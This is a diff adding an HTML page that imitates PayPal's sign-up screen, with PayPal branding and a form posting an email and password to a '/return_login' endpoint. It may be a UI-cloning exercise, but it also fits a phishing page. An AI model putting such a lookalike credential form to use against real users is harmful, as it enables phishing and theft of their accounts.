@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="email_pass.css">
+    <title>Sign Up in Paypal</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=PT+Sans:wght@400&display=swap');
+* {
+    margin: 0;
+    padding: 0;
+}
+
+body,
+html {
+    height: 100vh;
+    width: 100%;
+    font-family: 'PT Sans', sans-serif;
+}
+#main-container {
+    width: 100%;
+    height: 100%;
+    display: flex;
+    align-items: center;
+}
+#container{
+    margin: auto;
+    height: 100%;
+}
+#main-content {
+    width: 100%;
+    height: 100%;
+}
+header{
+    display: flex;
+    justify-content: space-between;
+    height: 4.5rem;
+    align-items: center;
+    width: 100%;
+}
+header>a {
+    color: #1072eb;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+header>a:hover {
+    text-decoration: underline;
+}
+
+#email_pass {
+    display: flex;
+    flex-direction: column;
+    background-color: #fff;
+    margin: 0 auto;
+    max-width: 528px;
+    min-height: calc(100vh - 4.5rem - 77px);
+}
+#email_pass span:nth-of-type(1){
+    font-size: 2rem;
+    line-height: 2.5rem;
+    font-weight: 400;
+    margin: 10px 0;
+}
+#email_pass span:nth-of-type(2){
+    font-size: 1.25rem;
+    line-height: 1.75rem;
+    font-weight: 500;
+    margin: 10px 0;
+}
+#email_pass>input{
+    padding: 1rem;
+    margin: 7px 0;
+    border-radius: 3px;
+    font-size: 14px;
+    background: white;
+    border: 1px solid rgb(139, 139, 139);
+    max-width: 100%;
+}
+#email_pass>input::placeholder{
+    font-weight: 500;
+}
+input[type=number]::-webkit-inner-spin-button, 
+input[type=number]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+}
+#email_pass>p{
+    margin: 30px 0;
+}
+#email_pass>button{
+    margin: 4.5rem auto;
+    min-width: 12rem;
+    padding: 0.6875rem 1.4375rem;
+    transition: color .2s ease,background-color .2s ease,border-color .2s ease,box-shadow .2s ease;
+    background-color: #0070ba;
+    border-radius: 1.5rem;
+    border: 0.0625rem solid #0070ba;
+    color: #fff;
+    font-weight: 500;
+    font-size: .9375rem;
+    width: 190px;
+    cursor: pointer;
+}
+#email_pass>button:hover {
+    background-color: #003087;
+}
+
+    </style>
+</head>
+<body>
+    <div id="main-container">
+
+        <div id="container">
+            <div id="main-content">
+                    <header><p>.</p><img src="./images/paypal-mark-color.svg" alt="img not found" draggable="false" width="35px" height="35px"><p>.</p></header>
+                    <form action="/return_login" method="post" id="email_pass">
+                        <span align="center">Set up your profile</span>
+                        <span align="center">This information needed to be accurate</span>
+                        <input type="email" name="email" id="email" placeholder="Email address">
+                        <input type="password" name="password" class="password" placeholder="Create your password">
+                        
+                        <button type="submit">Next</button>
+                    </form>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
